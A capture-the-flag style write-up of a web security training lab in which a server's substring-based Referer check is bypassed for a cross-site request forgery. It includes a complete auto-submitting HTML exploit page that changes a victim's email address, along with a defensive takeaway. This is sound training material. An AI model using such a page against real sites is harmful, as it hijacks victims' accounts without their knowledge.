This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`


----------------


# Solution

The server checks that the `Referer` header **contains** its own domain name — but it’s just a substring check, not an exact match.

The exploit uses `history.pushState("", "", "/?target-domain.net")` to rewrite the exploit page’s URL in the browser **without reloading it**. Now the page’s URL contains the target domain in the query string. When the form auto-submits, the browser sends that full URL as the Referer, which passes the substring check.

Two things are needed to make this work:

1. **`history.pushState`** — rewrites the URL to include the target domain
2. **`Referrer-Policy: unsafe-url`** — both as an HTTP response header and a meta tag — because modern browsers strip query strings from the Referer by default. This forces the browser to send the full URL including `?target-domain.net`

Without the policy override, the browser would strip the query string and the Referer would just be `https://exploit-server.net/exploit` — no target domain, check fails.

**Key takeaway:** Substring-based Referer validation is weak. If the server just checks “does the Referer contain my domain,” an attacker can stuff the domain into any part of the URL. Proper validation should check the Referer’s **origin** (scheme + host + port) matches exactly.



```
<html>
    <head>
        <meta name="referrer" content="unsafe-url">
    </head>
    <body>
        <form action="https://0a2800f104089dc580c9fdf200df0064.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            history.pushState("", "", "/?https://0a2800f104089dc580c9fdf200df0064.web-security-academy.net/");
            document.forms[0].submit();
        </script>
    </body>
</html>
```


